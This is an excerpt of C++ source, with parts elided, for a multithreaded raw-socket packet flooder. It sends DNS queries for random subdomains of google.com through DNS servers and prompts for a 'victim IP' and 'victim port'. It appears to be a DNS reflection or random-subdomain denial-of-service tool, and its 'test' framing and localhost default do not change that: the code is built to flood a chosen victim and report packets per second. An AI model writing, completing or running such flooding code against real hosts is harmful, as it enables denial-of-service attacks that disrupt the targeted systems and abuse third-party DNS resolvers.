...
// Global atomic counter for packets sent (thread-safe)
std::atomic<size_t> packetsSent(0);

// Function for each thread to send packets
void sendPacketsThread(const std::vector<std::string>& dnsServers, const std::string& victimIP, uint16_t victimPort, uint16_t dnsPort, size_t labelLength, std::chrono::steady_clock::time_point endTime) {
    std::random_device rd;
    std::mt19937 gen(rd());

    while (std::chrono::steady_clock::now() < endTime) {
        std::string randomLabel = randomString(labelLength);
        std::string targetDomain = randomLabel + ".google.com";
        ...
        size_t packet_size = sizeof(iphdr) + sizeof(udphdr) + 50;  // Adjust as needed
...
int main() {
    ...
    std::string victimIP = "127.0.0.1";
    uint16_t victimPort = 23837;
    uint16_t dnsPort = 53;
    size_t labelLength = 10;
    size_t numThreads = 4;  // Adjust based on CPU cores

    // Prompts (IP/port as before, plus mode selection)
    std::string input;
    std::cout << "Enter victim IP (default: 127.0.0.1): ";
    std::getline(std::cin, input);
    if (!input.empty()) victimIP = input;

    std::cout << "Enter victim port (default: 23837): ";
    std::getline(std::cin, input);
    if (!input.empty()) victimPort = static_cast<uint16_t>(std::stoi(input));

    std::cout << "Enter test duration in seconds (e.g., 60; default: 60): ";
    std::getline(std::cin, input);
    int duration = (!input.empty()) ? std::stoi(input) : 60;
    ...
    std::cout << "Starting " << duration << "s test with " << numThreads << " threads..." << std::endl;
    ...
    for (size_t t = 0; t < numThreads; ++t) {
        threads.emplace_back(sendPacketsThread, dnsServers, victimIP, victimPort, dnsPort, labelLength, endTime);
    }
    ...
    std::cout << "Sent " << packetsSent.load() << " packets in " << elapsed << " seconds (" << (packetsSent / elapsed) << " pps)." << std::endl;
    return 0;
}
